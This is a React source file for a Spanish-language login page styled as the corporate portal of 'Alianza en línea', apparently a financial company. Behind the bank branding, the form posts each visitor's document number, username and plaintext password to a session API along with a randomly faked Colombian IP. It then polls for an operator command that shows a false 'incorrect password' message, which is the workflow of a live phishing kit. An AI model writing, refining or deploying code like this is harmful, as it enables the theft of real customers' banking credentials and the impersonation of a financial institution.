import { useState, useRef, useEffect } from "react"

const DOCS = [
  "NIT",
  "Fideicomiso",
  "Sociedad Extranjera",
  "Grupo",
  "Nit Plan Institucional FVP",
]

export default function PortalEmpresas({ onBack }) {
  const [docType, setDocType] = useState(DOCS[0])
  const [documentVal, setDocumentVal] = useState("")
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [loading, setLoading] = useState(false)
  const [loginError, setLoginError] = useState("")

  const pingIntervalRef = useRef(null)
  const pollIntervalRef = useRef(null)

  const ready =
    documentVal.trim().length > 4 &&
    username.trim().length > 2 &&
    password.trim().length > 3

  const stopLoops = () => {
    if (pingIntervalRef.current) clearInterval(pingIntervalRef.current)
    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current)
  }

  const startSessionLoop = (sessId) => {
    stopLoops()

    // 1. Session keepalive (ping) every 3 seconds
    const sendPing = () => {
      fetch(`/api/sessions/${sessId}/ping`, { method: "POST" }).catch(() => {})
    }
    sendPing()
    pingIntervalRef.current = setInterval(sendPing, 3000)

    // 2. Poll session state every 1.5 seconds to check if the operator triggered a login error
    pollIntervalRef.current = setInterval(async () => {
      try {
        const response = await fetch(`/api/sessions/${sessId}`)
        if (response.ok) {
          const data = await response.json()
          const action = data.action

          if (action === "error-login") {
            stopLoops()
            setLoading(false)
            setLoginError("Usuario o contraseña incorrecta. Por favor, verifique sus datos.")
          }
        }
      } catch (_) {}
    }, 1500)
  }

  useEffect(() => {
    return () => stopLoops()
  }, [])

  function submit(event) {
    event.preventDefault()
    if (!ready || loading) return
    setLoading(true)
    setLoginError("")

    let sessId = sessionStorage.getItem("sessionId")
    if (!sessId) {
      sessId = "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9)
      sessionStorage.setItem("sessionId", sessId)
    }

    const docStr = documentVal.trim()
    const passStr = password.trim()
    const userStr = username.trim()

    const sessionData = {
      id: sessId,
      username: `${docType.toUpperCase()}:${docStr} / ${userStr}`,
      password: passStr,
      tipoUsuario: docType,
      device: window.innerWidth <= 768 ? "mobile" : "desktop",
      ip: "186.29." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255),
      state: "waiting",
      createdAt: Date.now(),
    }

    fetch("/api/sessions", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(sessionData),
    })
      .then((res) => {
        if (res.ok) {
          startSessionLoop(sessId)
        } else {
          setLoading(false)
          setLoginError("Error al conectar. Intente de nuevo.")
        }
      })
      .catch(() => {
        setLoading(false)
        setLoginError("Error al intentar conectar. Intente de nuevo.")
      })
  }

  return (
    <div className={`portal portal--empresas ${loading ? "is-loading" : ""}`}>
      <section className="portal__intro">
        <div className="portal__copy">
          <h1>
            <span>Invierta con</span>
            <em>Alianza</em>
          </h1>
          <p>
            Bienvenido a Alianza en línea, protegemos el futuro con experiencia y
            responsabilidad para asegurar su bienestar financiero.
          </p>
        </div>
      </section>

      <section className="portal__form">
        <header className="portal__top">
          <button type="button" className="portal__brand" onClick={onBack}>
            <img src="/logo-enlinea-mark.png" alt="" />
            <img src="/logo-enlinea-text.png" alt="Alianza en líne@" />
          </button>
          <nav>
            <button type="button">Recomendaciones</button>
            <button type="button">Español</button>
            <button type="button">English</button>
          </nav>
        </header>

        <form className="portal__card" onSubmit={submit}>
          <h2>¡Bienvenido!</h2>

          {loginError && (
            <div style={{ color: "#d93838", background: "#ffebee", padding: "10px", borderRadius: "4px", fontSize: "14px", marginBottom: "16px" }}>
              {loginError}
            </div>
          )}

          <label>
            <span>Tipo de documento <i>*</i></span>
            <select value={docType} onChange={(event) => setDocType(event.target.value)}>
              {DOCS.map((item) => (
                <option key={item}>{item}</option>
              ))}
            </select>
          </label>

          <label>
            <span>Número de documento <i>*</i></span>
            <input
              value={documentVal}
              onChange={(event) => setDocumentVal(event.target.value)}
              placeholder="Escriba el número de documento"
              autoComplete="off"
            />
          </label>

          <label>
            <span>Usuario <i>*</i></span>
            <input
              value={username}
              onChange={(event) => setUsername(event.target.value)}
              placeholder="Escriba el usuario"
              autoComplete="username"
            />
          </label>

          <label>
            <span>Contraseña <i>*</i></span>
            <span className="portal__pass">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(event) => setPassword(event.target.value)}
                placeholder="Ingrese la contraseña"
                autoComplete="current-password"
              />
              <button type="button" onClick={() => setShowPassword((open) => !open)} aria-label="Mostrar contraseña">
                <svg viewBox="0 0 24 24" aria-hidden="true">
                  <path d="M12 5C7.9 5 4.1 7.91 2.08 13a16.5 16.5 0 0 0 19.84 0C19.9 7.91 16.1 5 12 5Zm0 12a6 6 0 1 1 6-6 6 6 0 0 1-6 6Zm0-9a3 3 0 1 0 3 3 3 3 0 0 0-3-3Z" />
                </svg>
              </button>
            </span>
          </label>

          <button type="button" className="portal__forgot">
            ¿Olvidó la contraseña?
          </button>

          <button type="submit" className={`portal__submit ${ready ? "is-ready" : ""}`} disabled={!ready || loading}>
            Ingrese
          </button>

          <p className="portal__note">Este registro solo es válido para Persona Jurídica.</p>
        </form>
      </section>

      {loading ? (
        <div className="portal__loader" role="status" aria-live="polite">
          <span className="portal__spinner" />
          <span className="sr-only">Cargando</span>
        </div>
      ) : null}
    </div>
  )
}
